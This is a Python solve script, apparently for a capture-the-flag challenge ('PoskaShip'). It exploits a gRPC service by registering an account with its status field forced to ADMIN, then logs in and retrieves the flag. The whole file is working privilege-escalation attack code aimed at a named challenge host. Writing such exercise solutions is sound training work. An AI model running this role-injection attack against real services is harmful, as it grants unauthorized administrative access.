#! /usr/bin/env python3
import sys
import grpc
import argparse
import random
import string
import time

try:
    from client import create_client_channel, PoskaShipStub
    import poskaship_pb2
except ImportError as e:
    print(f"Erreur d'import: {e}")
    sys.exit(1)

def get_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def solve(remote_host):
    print(f"[*] Cible : {remote_host}")
    
    # Classes de messages identifiées
    ProfileMsg = getattr(poskaship_pb2, 'Profile')
    EmptyMsg = getattr(poskaship_pb2, 'EmptyRequest')
    
    # Le serveur a répondu "need at least 2".
    # On force le status à 2 (ADMIN) pour l'enregistrement.
    # C'est une vulnérabilité classique où le client peut choisir son rôle.
    try:
        target_status = getattr(poskaship_pb2, 'ADMIN')
        print(f"[*] Constante ADMIN trouvée dans le proto : {target_status}")
    except AttributeError:
        target_status = 2
        print(f"[*] Pas de constante ADMIN trouvée, on force la valeur : {target_status}")

    username = get_random_string()
    password = get_random_string()
    print(f"[*] Credentials générés -> User: {username} / Pass: {password}")

    with create_client_channel(remote_host, tls=True) as cc:
        stub = PoskaShipStub(*cc)

        # 1. Enregistrement (Privilege Escalation)
        print("\n[*] Tentative de Register en tant qu'ADMIN...")
        try:
            # On injecte le status 2 directement à la création du compte
            req = ProfileMsg(username=username, password=password, status=target_status)
            resp = stub.Register(req)
            print(f"    [+] Register OK : {resp}")
        except Exception as e:
            print(f"    [-] Erreur Register : {e}")

        # 2. Connexion
        print("\n[*] Tentative de Login...")
        try:
            req = ProfileMsg(username=username, password=password)
            resp = stub.Login(req)
            print(f"    [+] Login OK ! Session ID récupéré.")
            print(f"    [i] Détails session : {resp}")
        except Exception as e:
            print(f"    [-] Erreur Login : {e}")
            return

        # 3. Récupération du Flag
        print("\n[*] Tentative de GetFlag (avec privilèges élevés)...")
        try:
            req = EmptyMsg()
            responses = stub.GetFlag(req)
            
            # Gestion du flux
            found = False
            try:
                # Si c'est un itérateur
                for r in responses:
                    print(f"    [>] RÉPONSE : {r}")
                    found = True
            except TypeError:
                # Si c'est un objet simple
                print(f"    [>] RÉPONSE UNIQUE : {responses}")
                found = True
            
            if found:
                print("\n[SUCCESS] Si le flag est affiché ci-dessus, le challenge est validé !")

        except Exception as e:
            print(f"    [-] Erreur GetFlag : {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('remote', nargs='?', default='www.passetonhack.fr')
    args = parser.parse_args()
    solve(args.remote)
